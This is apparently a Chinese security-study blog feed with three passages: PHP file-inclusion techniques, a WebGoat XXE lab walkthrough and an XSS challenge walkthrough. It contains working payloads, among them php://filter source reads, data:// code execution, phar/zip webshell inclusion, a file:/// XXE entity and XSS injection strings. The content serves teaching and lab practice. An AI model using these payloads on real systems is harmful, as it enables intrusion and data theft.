title="1.配合文件上传使用"></a>1.配合文件上传使用</h4><p>当网站上传点，只限制图片类型，且无法绕过，不能利用.htaccess进行绕过，但是对图片内容没有进行过滤</p><p>可以考虑</p><blockquote><p>1.上传图片🐎包含一句话木马内容</p><p>2.找到文件包含漏洞，包含上传图片🐎，利用include解析任意文件为php，来实现getshell</p></blockquote><h4 id="2-包含Apache日志文件"><a href="#2-包含Apache日志文件" class="headerlink" title="2.包含Apache日志文件"></a>2.包含Apache日志文件</h4><p>有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。</p><p>利用的条件</p><ul><li>对日志文件可读</li><li>知道日志文件存储目录</li></ul><p>注意</p><ul><li>一般情况下日志存储目录会被修改，需要读取服务器配置文件(httpd.conf,nginx.conf…)或者根据phpinfo()中的信息来得知</li><li>日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式。</li></ul><h4 id="3-包含session文件"><a href="#3-包含session文件" class="headerlink" title="3.包含session文件"></a>3.包含session文件</h4><p>可以根据尝试包含到session文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p><p>利用条件：</p><ul><li>找到session内的可控变量</li><li>session文件可读写，并且知道存储路径</li></ul><p>php的session文件保存路径可以在phpinfo的session.save_path看到。</p><p>session常见存储路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">linux:</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows:(phpstudy安装的php环境下，session存储路径)</span><br><span class="line">D:\phpstudy_pro\Extensions\tmp\tmp</span><br></pre></td></tr></table></figure><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230804222350447.png" alt="image-20230804222350447"></p><h4 id="4-包含临时文件"><a href="#4-包含临时文件" class="headerlink" title="4.包含临时文件"></a>4.包含临时文件</h4><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230804225803750.png" alt="image-20230804225803750"></p><p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p><h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><p>如果php的配置选项<code>allow_url_include、allow_url_fopen</code>状态为**<code>on</code>**的话，则<code>include/require</code>函数是可以加载远程文件的，这种漏洞被称为远程包含文件(RFI)</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/phptest/b.php?id=http://ip/文件路径</span><br></pre></td></tr></table></figure><p>注意：远程包含的路径必须是<code>绝对路径</code></p><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230803154537187.png" alt="image-20230803154537187"></p><h3 id="1-php-协议"><a href="#1-php-协议" class="headerlink" title="1.php://协议"></a>1.php://协议</h3><p><strong>(此协议主要用于读取php源代码时会用到)</strong></p><ul><li>条件：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:off/on</span><br><span class="line">allow_url_include:仅php://input php://stdin php://memory php://temp 需要on</span><br></pre></td></tr></table></figure><ul><li><p>作用：<br><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p></li><li><p>说明</p><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p></li></ul><h3 id="2-php-filter伪协议"><a href="#2-php-filter伪协议" class="headerlink" title="2.php://filter伪协议"></a>2.php://filter伪协议</h3><ul><li><p>条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on</span><br><span class="line"></span><br><span class="line">allow_url_include=off</span><br></pre></td></tr></table></figure><p>只是读取，需要开启allow_url_fopen,不需要开启allow_url_include</p></li><li><p>说明</p><p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写</p><p>1.输出进行<code>base64</code>加密后的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=xx.php</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=xx.php</span><br></pre></td></tr></table></figure><p>2.获得将base64加密后的信息后，再将其解密，得出原信息</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805162835581.png" alt="image-20230805162835581"></p></li></ul><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805162956983.png" alt="image-20230805162956983"></p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805163658503.png" alt="image-20230805163658503"></p><h3 id="3-php-input（读取POST数据）"><a href="#3-php-input（读取POST数据）" class="headerlink" title="3.php://input（读取POST数据）"></a>3.php://input（读取POST数据）</h3><ul><li> 条件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on/off</span><br><span class="line"></span><br><span class="line">allow_url_include=on</span><br></pre></td></tr></table></figure><ul><li><p>说明</p><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。</p><p><code>enctype=“multipart/form-data”</code>的时候php://input是<code>无效</code>的</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805161936827.png" alt="image-20230805161936827"></p></li></ul><h3 id="4-file-伪协议-读取文件内容"><a href="#4-file-伪协议-读取文件内容" class="headerlink" title="4.file://伪协议(读取文件内容)"></a>4.file://伪协议(读取文件内容)</h3><ul><li><p>条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on/off</span><br><span class="line">allow_url_include=on/off  (均不收影响)</span><br></pre></td></tr></table></figure><p>打ctf中常用于读取本地文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=file://C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805094807948.png" alt="image-20230805094807948"></p></li></ul><blockquote><p><code>路径必须是绝对路径</code></p><p>在文件包含中，使用file://伪协议时，路径必须是绝对路径。例如，在Linux系统环境下，可以使用<code>?file=file:///etc/passwd</code>来访问本地文件系统。在Windows系统环境下，可以使用<code>?file=file:///C:\\DVWA-master\\vulnerabilities\\fi\\1.txt</code>来访问本地文件系统。</p></blockquote><h3 id="5-phar-伪协议-读取压缩包文件内容"><a href="#5-phar-伪协议-读取压缩包文件内容" class="headerlink" title="5.phar://伪协议(读取压缩包文件内容)"></a>5.phar://伪协议(读取压缩包文件内容)</h3><ul><li><p>条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:on/off</span><br><span class="line">allow_url_include:on/off(均不受影响)</span><br></pre></td></tr></table></figure><p>注：</p><p>php 版本大于等于<code>5.3.0</code>，压缩包需要是<code>zip</code>协议压缩，<code>rar</code>不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。</p></li><li><p>格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://压缩包名/内部文件名</span><br></pre></td></tr></table></figure><p>例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://x.zip/x.php</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805165447995.png" alt="image-20230805165447995"></p><h4 id="压缩包木马getshell"><a href="#压缩包木马getshell" class="headerlink" title="压缩包木马getshell"></a>压缩包木马getshell</h4><p>连接html.zip压缩包中的muma.php文件，利用muma.php文件中的一句话木马拿到getshell</p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805165956230.png" alt="image-20230805165956230" style="zoom:80%;"><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805170308883.png" alt="image-20230805170308883" style="zoom: 80%;"><h3 id="6-zip-伪协议"><a href="#6-zip-伪协议" class="headerlink" title="6.zip://伪协议"></a>6.zip://伪协议</h3><p>zip伪协议和phar协议类似，但是用法不一样(url不同)</p><ul><li><p>条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:on/off</span><br><span class="line">allow_url_include:on/off(均不受影响)</span><br></pre></td></tr></table></figure></li><li><p>格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</span><br></pre></td></tr></table></figure><blockquote><p>url中单纯输入#号，不会被解析，换成%23才能可以被解析。</p><p>在URL中，<code>#</code>号用于指定书签，它代表网页中的一个位置。如果您想在URL参数中使用<code>#</code>号，您需要将其替换为<code>%23</code>。这样，服务器才能正确解析它。</p></blockquote><p>例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip://D:\phpstudy\WWW\x.zip%23shell.php       #-&gt;%23</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805171114728.png" alt="image-20230805171114728"></p><h3 id="7-data-伪协议-读取文件"><a href="#7-data-伪协议-读取文件" class="headerlink" title="7.data://伪协议(读取文件)"></a>7.data://伪协议(读取文件)</h3><p>（可以直接达到执行php代码的效果）<br>和<code>php://input</code>很像，<code>php://input</code>以<code>post</code>提交数据那样提交数据，<br><code>data://</code>是以<code>get</code>方式提交数据，也是可以执行提交的脚本</p><ul><li><p>格式</p><blockquote><p><code>?file=data://text/plain,&lt;?php phpinfo()?&gt;</code><br>如果对特殊字符进行了过滤，可以通过base64编码后再输入<br>data://text/plain;base64,base64加密的代码<br>可配合php命令执行漏洞，实现对一些数据的获取<br>如:<code>&lt;?php system(&quot;ls&quot;)?&gt;</code>绕过<br><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</code></p></blockquote></li></ul><p><code>data://text/plain,&lt;?php phpinfo()?&gt;</code></p><p>text/plain,就是content-Type，指代GET提交数据的类型</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805200048688.png" alt="image-20230805200048688"></p><blockquote><p><code>data://</code> 是一种伪协议，它允许你将数据嵌入到 URL 中。在你提到的例子中，<code>data://image/gif,&lt;?php phpinfo()?&gt;</code>，<code>image/gif</code> 是数据的 MIME 类型，它指定了数据的格式。但是，在这种情况下，MIME 类型并不影响 PHP 代码的执行。</p><p>当 PHP 解析器遇到 <code>include</code> 或 <code>require</code> 语句时，它会读取指定文件的内容并执行其中的 PHP 代码。如果你使用 <code>data://</code> 伪协议来包含一个字符串，PHP 解析器会将该字符串视为文件内容并执行其中的 PHP 代码。因此，在你提到的例子中，尽管 MIME 类型指定为 <code>image/gif</code>，但 PHP 解析器仍然会执行 <code>&lt;?php phpinfo()?&gt;</code> 中的 PHP 代码。总之，MIME 类型只是用来指定数据格式的，并不影响 PHP 代码的执行。当你使用 <code>data://</code> 伪协议来包含一个字符串时，PHP 解析器会忽略 MIME 类型并执行其中的 PHP 代码.</p></blockquote><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="1-路径长度绕过后缀"><a href="#1-路径长度绕过后缀" class="headerlink" title="1.路径长度绕过后缀"></a>1.路径长度绕过后缀</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;123&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$a</span>.<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果限制了文件类型，比如这里只能包含<code>html</code>后缀的文件，那么就可以使用此方法。</p><p><code>操作系统存在的最大路径长度的限制</code></p><blockquote><p>windows系统，文件名最长256个字符</p><p>linux系统，文件名长4096个字符（浏览器最多只能输入300多个字符，所以需要抓包）</p><p>前面加././././……..xx.php</p><p>可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，<code>导致扩展名被中途截断</code></p><p>info.php………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………….html</p><p><code>.</code>超过256个就行，后面多出来的<code>...........................................html</code>不会被识别到</p></blockquote><h3 id="2-截断后缀"><a href="#2-截断后缀" class="headerlink" title="2.?截断后缀"></a>2.?截断后缀</h3><p>往往文件包含中会出现</p><blockquote><p>(“$file”.”.html”)</p><p>这里以html为例子，这样我们输入的文件名称参数后面终会跟上.html后缀，从而导致文件包含失败</p><p>要截断后缀，只需要在末尾添加 <code>?</code> 即可，这样后缀就会变成 URL 的参数</p></blockquote><h3 id="3-点过滤，网址-ip无法输入"><a href="#3-点过滤，网址-ip无法输入" class="headerlink" title="3. .点过滤，网址/ip无法输入"></a>3. .点过滤，网址/ip无法输入</h3><p>ip转长整型，里面有一句话木马，需要vps</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.bejson.com/convert/ip2int/</span><br></pre></td></tr></table></figure><p>如将IP地址219.239.110.138转换为数字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">219 * 256^3 + 239 * 256^2 + 110 * 256^1 + 138 * 256^0 = 3689901706</span><br></pre></td></tr></table></figure><p>因此，219.239.110.138的数字地址为3689901706。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &quot;http://3689901706&quot;;</span><br></pre></td></tr></table></figure><h3 id="4-被过滤"><a href="#4-被过滤" class="headerlink" title="4. ;被过滤"></a>4. ;被过滤</h3><p>?&gt;闭合代码</p><p>因为?&gt;可以替代php代码中最后一个分号的作用</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805150200146.png" alt="image-20230805150200146"></p><h3 id="5-强制加后缀"><a href="#5-强制加后缀" class="headerlink" title="5.强制加后缀"></a>5.强制加后缀</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如 <span class="keyword">include</span>(<span class="variable">$cmd</span>.<span class="string">&quot;.php&quot;</span>)</span><br><span class="line"><span class="variable">$cmd</span>=data:<span class="comment">//text/plain,&lt;?php phpinfo()?&gt;</span></span><br><span class="line"><span class="comment">// 后面再拼接上.php的时候，由于php语句已经闭合，所以起不了什么作用</span></span><br></pre></td></tr></table></figure><h3 id="6-路径过滤"><a href="#6-路径过滤" class="headerlink" title="6.路径过滤"></a>6.路径过滤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如replace(&#x27;./&#x27;,&#x27;&#x27;) ==&gt;</span><br><span class="line">可以用 ...//...//...//...//...//flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxe靶场</title>
      <link href="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p><code>webgoat xxe靶场学习</code></p><span id="more"></span><h2 id="1-let’s-try"><a href="#1-let’s-try" class="headerlink" title="1.let’s try"></a>1.let’s try</h2><blockquote><p>任务目标：</p><p>在此作业中，您将向照片添加评论，提交表单时尝试使用评论字段执行 XXE 注入。尝试列出文件系统的根目录。</p></blockquote><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811155305646.png" alt="image-20230811155305646"></p><p>评论抓包</p><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811155628447.png" alt="image-20230811155628447"></p><p>发现评论数据传输是xml文件格式</p><p>尝试进行xxe注入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">root</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/&quot;</span>&gt;</span>     </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line">      <span class="symbol">&amp;root;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">root</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/&quot;</span>&gt;</span>     </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>1.<code>&lt;!DOCTYPE&gt;是dtd文件的格式</code></p><p>2.<code>comment []是根（父）元素，[]中可以进行定义ENTITY(变量名)或者ELEMENT(标签名)</code></p><p>3.<code>&lt;!ENTITY root SYSTEM &quot;file:///C:/&quot;&gt; 用file伪协议读取C盘根目录内容，赋值给实体root</code></p><p>4.<code>&amp;root;</code>这个是实体值的调用格式</p></blockquote><p>发送<code>payload</code></p><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811161301169.png" alt="image-20230811161301169"></p><h2 id="2-Modern-REST-framework"><a href="#2-Modern-REST-framework" class="headerlink" title="2.Modern REST framework"></a>2.Modern REST framework</h2><blockquote><p>在现代 REST 框架中，服务器可能能够接受您作为开发人员没有想到的</p><p>数据格式。因此，这可能会导致 JSON 端点容易受到 XXE 攻击。</p><p>再次进行相同的练习，但尝试执行与第一次作业相同的 XML 注入。</p></blockquote><p>根据题目，先抓包看看</p><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811165945895.png" alt="image-20230811165945895"></p><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811170453542.png" alt="image-20230811170453542"></p><p>抓包看到的Content-Type是json格式，题目说尝试执行与第一次作业相同的 XML 注入，尝试一下看看</p><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811170925749.png" alt="image-20230811170925749"></p><p>发送后，响应内容提示</p><blockquote><p>You are posting JSON which does not work with a XXE</p></blockquote><p>告诉我们，我们发送的数据是json，并不是有效的xxe注入</p><p>但是我们发送的内容明明是xml文件格式，为什么会被认为是json而不是xml呢</p><p>仔细查看请求包中数据发现</p><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811172431865.png" alt="image-20230811172431865"></p><p>这里的<code>Content-Type: application/json</code>是json，所以我们发送的post数据包，会被json解析器解析而不是我们想要的xml解析器</p><p>所以想要实现我们的xxe注入，需要修改Content-Type为xml类型</p><p>就是改成<code>Content-Type: application/xml</code></p><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811172639504.png" alt="image-20230811172639504"></p><h2 id="3-Blind-XXE-assignment"><a href="#3-Blind-XXE-assignment" class="headerlink" title="3.Blind XXE assignment"></a>3.Blind XXE assignment</h2><blockquote><p>在上一页中，我们向您展示了如何使用XXE攻击ping服务器，在此作业中尝试制作一个DTD，它将文件机密的内容从WebGoat服务器上传到我们的WebWolf服务器.txt。您可以使用 WebWolf 来提供 DTD。secret.txt 位于 WebGoat 服务器上的以下位置，因此您无需扫描所有目录和文件：</p><table><thead><tr><th align="left"><strong>OS</strong></th><th align="left">位置</th></tr></thead><tbody><tr><td align="left"><code>Windows 10</code></td><td align="left"><code>C:\Users\dokiy/.webgoat-8.1.0//XXE/secret.txt</code></td></tr></tbody></table><p>尝试使用 WebWolf 登录页面上传此文件，例如：（注意：此端点由您完全控制） 获得文件内容后，将其作为新评论发布在页面上，您将解决课程。</p></blockquote><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811172956473.png" alt="image-20230811172956473"></p><p>抓包评论</p><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811212740983.png" alt="image-20230811212740983"></p><p>发现就是正常的xml</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss靶场</title>
      <link href="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/07/21/xss%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h2><p>进入第一关，查看页面反馈信息</p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230721213727673.png" alt="image-20230721213727673"></p><p>f12查看网站源码，</p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230721214256934.png" alt="image-20230721214256934"></p><p>发现参数会被插入标题中，所以我们输入一段简单的弹窗代码进行尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>结果页面弹窗提示我们通关，证明我们输入的参数在被get到的时候没有经过特殊的过滤处理。</p><h2 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h2><p>这一关多了搜索框，尝试一下第一关的弹窗代码，发现没有弹窗也没有提示通关，<code>证明输入的内容在被get的时候经过了过滤，代码不生效。</code></p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230721215641260.png" alt="image-20230721215641260"></p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230721220340715.png" alt="image-20230721220340715"></p><p>查看网站源码，发现value值是用双引号闭合的</p><p>闭合value值之后，我们还要闭合掉input标签，我们试一下弹窗代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230722092957076.png" alt="image-20230722092957076"></p><h2 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h2><p>先按照上一关的playload试试，发现不行，查看源代码</p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230722094256601.png" alt="image-20230722094256601"></p><p>value值用<code>单引号闭合</code>，&lt;&gt;被转义成为字符了</p><p>on触发一个事件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onmouseover=&#x27;javascript:alert(1)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230722095314351.png" alt="image-20230722095314351"></p><h3 id="on事件"><a href="#on事件" class="headerlink" title="on事件"></a>on事件</h3><p>onmouseover：</p><p>onclick:</p><h2 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h2><p>尝试playload，进行测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;script&gt;</span><br></pre></td></tr></table></figure><p>查看网站源代码</p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230722102719549.png" alt="image-20230722102719549"></p><p>发现对keyword的参数中&lt;&gt;替换为空，使用没有&lt;&gt;的payload进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&#x27;javascript:alert(1)&#x27;</span><br></pre></td></tr></table></figure><p>成功弹窗</p><h2 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h2><p>开始试一下弹窗代码，查看源代码</p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230722141710392.png" alt="image-20230722141710392"></p><p>发线源代码中限制了<script>标签的使用，再试试on时间</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230722142027718.png" alt="image-20230722142027718"></p><p>on被限制了o_n了，再试试别的</p><h3 id="a-href标签法"><a href="#a-href标签法" class="headerlink" title="a-href标签法"></a><strong>a-href标签法</strong></h3><p>href属性的意思是 当标签<a>被点击的时候，就会触发执行转跳，可以是转跳到一个网站，还可以触发执行一段js代码</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(&#x27;x&#x27;)&gt;xxx&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>最后构造函数是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(&#x27;x&#x27;)&gt;xxx&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230722142907058.png" alt="image-20230722142907058"></p><h2 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h2><p>跟第五关一样，<script>标签被限制了，on时间函数也被限制了</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230722144301370.png" alt="image-20230722144301370"></p><p>尝试用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(&#x27;a&#x27;)&gt;sss&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230722145133315.png" alt="image-20230722145133315"></p><p><a herf>也被过滤了，再试试别的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a hRef=javascript:alert(1)&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>好像没有strtolower函数欸，对吧，你是不是没过滤大小写。</p><p>插入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hRef=javascript:alert(1)&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230722150000808.png" alt="image-20230722150000808"></p><h2 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h2><p>跟第六关相似，<script>被过滤了，on时间被过滤了， <herf>也被过滤了</p><p>​        <img 